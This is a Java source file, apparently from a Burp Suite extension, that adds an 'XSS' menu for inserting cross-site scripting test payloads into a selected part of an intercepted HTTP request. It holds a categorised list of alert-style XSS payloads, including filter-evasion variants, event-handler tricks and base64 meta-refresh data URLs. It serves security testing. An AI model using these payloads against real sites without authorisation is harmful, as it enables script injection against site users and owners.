/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package burp;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JMenu;
import javax.swing.JMenuItem;

/**
 *
 * @author abdul.wahab
 */
public class XSS_Menu extends JMenu{
    public BurpExtender myburp;
    public String[] XSS_MainMenu = {"Basic", "img", "svg", "html5", "meta tag","file name","special"};
    public String XSS_MenuItem[][] = {
        {"<script>alert(6)</script>","<script>alert('XSS')</script>", "<script %20 src=1>alert(1)</script>","<scr<script>ipt>alert('XSS')</scr<script>ipt>", "\"><script>alert('XSS')</script>", "\"><script>alert(String.fromCharCode(88,83,83))</script>","\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"},
        {"<img src=x onerror=alert('XSS');>", "<img src=x onerror=alert('XSS')//", "<img src=x onerror=alert(String.fromCharCode(88,83,83));>", "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>", "<img src=x:alert(alt) onerror=eval(src) alt=xss>", "\"><img src=x onerror=alert('XSS');>", "\"><img src=x onerror=alert(String.fromCharCode(88,83,83));>"},
        {"<svg onload=alert(1)>", "<svg/onload=alert('XSS')>", "<svg onload=alert(1)//", "<svg/onload=alert(String.fromCharCode(88,83,83))>", "<svg id=alert(1) onload=eval(id)>", "\"><svg/onload=alert(String.fromCharCode(88,83,83))>", "\"><svg/onload=alert(/XSS/)"},
        {"<body onload=alert(/XSS/.source)>", "<input autofocus onfocus=alert(1)>", "<select autofocus onfocus=alert(1)>", "<textarea autofocus onfocus=alert(1)>", "<keygen autofocus onfocus=alert(1)>", "<video/poster/onerror=alert(1)>", "<video><source onerror=\"javascript:alert(1)\">", "<video src=_ onloadstart=\"alert(1)\">", "<details/open/ontoggle=\"alert`1`\">", "<audio src onloadstart=alert(1)>", "<marquee onstart=alert(1)>","'><marquee/onstart=confirm(1)>"},
        {"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", "<meta/content=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg==\"http-equiv=refresh>", "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">"},
        {"\"><img src=x onerror=alert(1)>.jpg"},
        {"onerror=alert;throw 1;","onerror=eval;throw'=alert\\x281\\x29';"}
    };
    
    XSS_Menu(BurpExtender burp){
        this.setText("XSS");
        this.myburp = burp;
        Methods.Create_Main_Menu(this, XSS_MainMenu, XSS_MenuItem, new XXSItemListener(myburp));
    }
}


class XXSItemListener implements ActionListener {

    BurpExtender myburp;
    XXSItemListener(BurpExtender burp) {
        myburp = burp;
    }
    
    @Override
    public void actionPerformed(ActionEvent e) {
        IHttpRequestResponse req = myburp.context.getSelectedMessages()[0];
        byte[] request = req.getRequest();
        
        int[] selectedIndex = myburp.context.getSelectionBounds();
        
        String action = e.getActionCommand();
        
        byte[] newRequest = GetNewRequest(request, selectedIndex, action);
        req.setRequest(newRequest);
    }
    
    public byte[] GetNewRequest(byte[] request,int[] selectedIndex, String action){
        String selectedString = action;
        return Methods.do_modify_request(request, selectedIndex, selectedString.getBytes());
    }
    

}